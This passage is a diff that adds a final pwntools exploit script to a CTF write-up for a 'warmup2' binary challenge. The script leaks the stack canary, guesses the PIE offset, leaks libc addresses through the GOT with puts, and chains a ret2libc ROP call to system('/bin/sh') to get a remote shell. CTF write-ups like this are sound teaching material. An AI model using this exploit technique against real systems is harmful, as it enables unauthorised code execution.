@@ -55,3 +55,111 @@ To leak libc I did a simple puts(puts) leak. To do this, I found a ROP gadget th
 # ROP into a Shell
 
 For our final ROP we just do a buffer overflow, preserve the canary, jump to a `ret` to realign the for libc (otherwise we'll get a segfault) then pop `/bin/bash` into rdi and call `system` which will get us a root shell! If this all works, then we should be able to easily read the flag within the server from there.
+
+# Final Script
+```python3
+#!/bin/env python3 
+from pwn import *
+
+FILE = "./chal"
+elf = ELF(FILE)
+
+BUFFER_SIZE = 0x110
+CANARY_OFFSET = -8
+DEBUG = True 
+
+PORT = 1337
+HOST = "warmup2.ctf.maplebacon.org"
+
+context.arch = "amd64"
+context.encoding = "latin"
+context.log_level = "debug" if (DEBUG) else "INFO"
+warnings.simplefilter("ignore")
+
+run = True 
+while (run):
+	p: process = process([FILE]) if (DEBUG) else remote(HOST, PORT)
+
+	# Leak canary
+	payload = b'A'*(BUFFER_SIZE + CANARY_OFFSET + 1) # +1 to overwrite the nullbyte of canary
+	p.send(payload)
+	p.recvuntil(payload)
+	
+	stackLeak = p.recvline(keepends=False)
+	canary = b'\x00' + stackLeak[:7]
+	
+	# Return to main, preserve canary & RBP
+	payload = b'A'*(0x110 + CANARY_OFFSET)
+	payload += canary
+	payload += b'B'*8
+	payload += 0xe2d8.to_bytes(2, 'little') # This is our guess of the binary offset
+	p.send(payload)
+	p.recvuntil(b'too!')
+	
+	# Try because we could have just segfaulted if we guessed wrong
+	try:
+		# Get main address
+		p.recvuntil(b'What')
+		payload = b'A'*(0x110 + CANARY_OFFSET)
+		payload += b'C'*8
+		payload += b'B'*8
+		p.send(payload)
+		
+		p.recvuntil(payload)
+		mainAddress = p.recvline(keepends=False)[:8][:-1]
+		mainAddress = int.from_bytes(mainAddress, 'little', signed=False)
+		baseAddress = mainAddress - 0x12e2
+	
+		payload = b'A'*(0x110 + CANARY_OFFSET)
+		payload += canary
+		payload += b'B'*8
+
+		# Jump to pop rdi; ret;
+		payload += p64(baseAddress + 0x1353) # pop rdi; ret
+		payload += p64(baseAddress + 0x3FA8) # Address of puts GOT
+		payload += p64(baseAddress + 0x10a4) # Jump to puts
+		
+		# Jump to pop rdi; ret;
+		payload += p64(baseAddress + 0x1353) # pop rdi; ret
+		payload += p64(baseAddress + 0x3FD0) # Address of read GOT
+		payload += p64(baseAddress + 0x10a4) # Jump to puts
+
+		payload += p64(baseAddress + 0x12d8)
+
+		p.send(payload)
+		p.recvuntil(b'!\n')
+		putsAddr = p.recvline(keepends=False)
+		readAddr = p.recvline(keepends=False)
+
+		print(f"[DEBUG] Puts Address: {putsAddr.hex()}")
+		print(f"[DEBUG] Read Address: {readAddr.hex()}")
+
+		putsInt = int.from_bytes(putsAddr, 'little', signed=False)
+		libcBase = putsInt - 0x84420
+
+		# Ret 2 libc baby!!!!
+		# non payload
+		p.recvuntil(b'What')
+		payload = b'A'*(0x110 + CANARY_OFFSET)
+		payload += b'C'*8
+		payload += b'B'*8
+		p.send(payload)
+
+		# ret 2 libc # call 
+		payload = b'A'*(0x110 + CANARY_OFFSET)
+		payload += canary
+		payload += b'B'*8
+
+		payload += p64(baseAddress + 0x1353) 	# ret to realign
+		payload += p64(libcBase + 0x1b45bd) 	# pop rdi; ret
+		payload += p64(baseAddress + 0x101a)	# Get address of /bin/sh into rdi
+		payload += p64(libcBase + 0x52290)		# Jump into system
+		p.send(payload)
+		p.interactive()
+
+		run = False
+	except:
+		pass
+	
+	p.close()
+```
